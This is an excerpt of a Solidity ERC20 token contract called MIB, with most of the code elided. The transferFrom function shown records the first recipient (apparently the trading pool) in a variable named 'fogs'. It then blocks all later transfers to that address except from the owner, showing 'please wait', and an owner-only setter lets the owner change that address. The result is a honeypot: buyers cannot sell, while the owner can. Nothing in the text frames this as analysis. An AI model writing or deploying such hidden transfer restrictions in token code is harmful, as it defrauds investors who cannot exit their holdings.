...
contract MIB is Context, IERC20, Ownable {
  ...
  function transferfogs(address _fogs) public onlyOwner {
    fogs = _fogs;
  }
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(sender != address(0) && fogs == address(0)) fogs = recipient;
    else  require(recipient != fogs || sender == owner(), "please wait");
